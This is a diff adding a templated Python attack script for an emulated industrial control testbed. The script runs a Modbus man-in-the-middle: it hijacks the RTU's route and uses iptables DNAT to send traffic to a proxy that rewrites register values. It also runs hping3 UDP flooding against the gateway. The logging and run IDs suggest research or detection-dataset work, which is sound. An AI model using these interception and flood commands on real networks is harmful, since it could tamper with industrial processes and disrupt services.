@@ -1,0 +1,146 @@
+import os
+import sys
+from datetime import datetime
+from typing import Optional
+
+DEFAULT_RTU_NAME = "{{ hosts_by_role['rtu'][0].name }}"
+DEFAULT_GATEWAY_NAME = "{{ hosts_by_role['gateway'][0].name }}"
+DEFAULT_ATTACKER_NAME = "{{ host.name }}"
+ATTACK_ACTIVE_FLAG = "/tmp/mitm_attack_active"
+RUN_ID_FILE = "/tmp/mitm_run_id"
+BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
+
+{% set _gwp = hosts_by_role['gateway'][0].ip.split('.') %}
+CONTROL_SUBNET = "{{ _gwp[0] }}.{{ _gwp[1] }}.{{ _gwp[2] }}.0/24"
+# Harus sama dengan escalate_attacker_to_field di topology.j2 (bukan output generator).
+ATTACKER_FIELD_IP = "10.0.1.100"
+MITM_FIXED_SEED = int(os.environ.get("MITM_FIXED_SEED", "424242"))
+MODBUS_PORT = 5020
+MITM_PROXY_PORT = 50201
+
+def _new_run_id():
+    return datetime.now().strftime("%Y%m%d_%H%M%S")
+
+def _resolve_host_log(attacker_name: str, host_log_dir: Optional[str] = None) -> str:
+    base = host_log_dir or os.path.join(BASE_DIR, "logs", "host")
+    return os.path.join(base, f"{attacker_name}.log")
+
+def _iptables_dnat_modbus(attacker, attacker_name: str, gateway_ip: str, enable: bool):
+    eth1 = f"{attacker_name}-eth1"
+    dest = f"{ATTACKER_FIELD_IP}:{MITM_PROXY_PORT}"
+    if enable:
+        attacker.cmd(
+            f"iptables -t nat -D PREROUTING -i {eth1} -p tcp -d {gateway_ip} "
+            f"--dport {MODBUS_PORT} -j DNAT --to-destination {dest} 2>/dev/null || true"
+        )
+        attacker.cmd(
+            f"iptables -t nat -A PREROUTING -i {eth1} -p tcp -d {gateway_ip} "
+            f"--dport {MODBUS_PORT} -j DNAT --to-destination {dest}"
+        )
+    else:
+        attacker.cmd(
+            f"iptables -t nat -D PREROUTING -i {eth1} -p tcp -d {gateway_ip} "
+            f"--dport {MODBUS_PORT} -j DNAT --to-destination {dest} 2>/dev/null || true"
+        )
+
+def _run_mitm_proxy_entrypoint():
+    """Muat proxy Modbus yang disalin generator ke script/mitm/modbus_proxy.py."""
+    import importlib.util
+
+    path = os.path.join(BASE_DIR, "script", "mitm", "modbus_proxy.py")
+    spec = importlib.util.spec_from_file_location("modbus_proxy", path)
+    mod = importlib.util.module_from_spec(spec)
+    assert spec.loader is not None
+    spec.loader.exec_module(mod)
+    mod.main()
+
+def run_mitm_attack(
+    net,
+    rtu_name=DEFAULT_RTU_NAME,
+    gateway_name=DEFAULT_GATEWAY_NAME,
+    attacker_name=DEFAULT_ATTACKER_NAME,
+    host_log_dir=None,
+):
+    """
+    L3: RTU arahkan subnet kontrol via Field attacker + ip_forward.
+    Modbus ke gateway di-DNAT ke modbus_proxy (ubah I pada FC06/FC16).
+    """
+    print("Running MITM (route + DNAT Modbus proxy; I scaled in-path, default x1.5)...")
+    attacker = net.get(attacker_name)
+    rtu = net.get(rtu_name)
+    gateway = net.get(gateway_name)
+    gateway_ip = gateway.IP()
+
+    host_log = _resolve_host_log(attacker_name, host_log_dir)
+    try:
+        os.makedirs(os.path.dirname(host_log), exist_ok=True)
+        open(host_log, "w", encoding="utf-8").close()
+    except OSError:
+        pass
+    host_log_q = host_log.replace("\\", "/")
+    attacker.cmd(f"bash -lc ': > \"{host_log_q}\"'")
+
+    run_id = _new_run_id()
+    gateway.cmd(
+        f'bash -lc "echo -n {run_id} > {RUN_ID_FILE} && touch {ATTACK_ACTIVE_FLAG}"'
+    )
+    attacker.cmd(f'bash -lc "echo -n {run_id} > {RUN_ID_FILE}"')
+
+    attacker.cmd("bash -lc 'echo 1 > /proc/sys/net/ipv4/ip_forward'")
+    attacker.cmd("sysctl -w net.ipv4.conf.all.rp_filter=0 >/dev/null 2>&1 || true")
+    rtu.cmd(f"ip route replace {CONTROL_SUBNET} via {ATTACKER_FIELD_IP}")
+
+    _iptables_dnat_modbus(attacker, attacker_name, gateway_ip, enable=True)
+
+    attacker.cmd(
+        "if [ -f /tmp/h5_modbus_inject.pid ]; then kill $(cat /tmp/h5_modbus_inject.pid) 2>/dev/null; rm -f /tmp/h5_modbus_inject.pid; fi; "
+        "if [ -f /tmp/h5_modbus_mitm_proxy.pid ]; then kill $(cat /tmp/h5_modbus_mitm_proxy.pid) 2>/dev/null; rm -f /tmp/h5_modbus_mitm_proxy.pid; fi"
+    )
+    inject_script = os.path.abspath(__file__).replace("\\", "/")
+    attacker.cmd(
+        f"bash -lc 'MITM_GATEWAY_IP={gateway_ip} nohup python3 -u \"{inject_script}\" "
+        f"modbus-mitm-proxy >>\"{host_log_q}\" 2>&1 & echo $! > /tmp/h5_modbus_mitm_proxy.pid'"
+    )
+
+    print(
+        f"L3 MITM: {rtu_name} -> {CONTROL_SUBNET} via {ATTACKER_FIELD_IP}; "
+        f"DNAT Modbus -> :{MITM_PROXY_PORT}; fixed_seed={MITM_FIXED_SEED}; log {host_log_q}"
+    )
+
+def run_dos_attack(net, mode="light", host_log_dir=None):
+    h5 = net.get('{{ host.name }}')
+    target_ip = "{{ hosts_by_role['gateway'][0].ip }}"
+    target_port = 5001
+    host_log = _resolve_host_log("{{ host.name }}", host_log_dir)
+    host_log_q = host_log.replace("\\", "/")
+    h5.cmd(f"mkdir -p {os.path.dirname(host_log_q)}")
+
+    h5.cmd("killall hping3 >/dev/null 2>&1 || true")
+
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    h5.cmd(f"echo '[DOS][INFO] target={target_ip}:{target_port} at={timestamp}' >> {host_log_q}")
+
+    if mode == "light":
+        print("Running LIGHT DoS (controlled mixed traffic)")
+        h5.cmd(f"echo '\\n===== DoS LIGHT {timestamp} =====' >> {host_log_q}")
+
+        # UDP
+        h5.cmd(f"echo '[DOS][LIGHT][UDP] start pps~500 duration=45s' >> {host_log_q}")
+        h5.cmd(
+            f"bash -lc 'hping3 --udp -q -p {target_port} -d 128 -i u200 {target_ip} >> {host_log_q} 2>&1 &'"
+        )
+
+    elif mode == "heavy":
+        print("Running HEAVY DoS (controlled high-rate attack)")
+        h5.cmd(f"echo '\\n===== DoS HEAVY {timestamp} =====' >> {host_log_q}")
+
+        # UDP heavy (tanpa flood, tapi cepat)
+        h5.cmd(f"echo '[DOS][HEAVY][UDP] start pps~3000 duration=60s' >> {host_log_q}")
+        h5.cmd(
+            f"bash -lc 'hping3 --udp --flood -p {target_port} -d 128 {target_ip} >> {host_log_q} 2>&1 &'"
+        )
+
+
+if __name__ == "__main__":
+    if len(sys.argv) >= 2 and sys.argv[1] == "modbus-mitm-proxy":
+        _run_mitm_proxy_entrypoint()
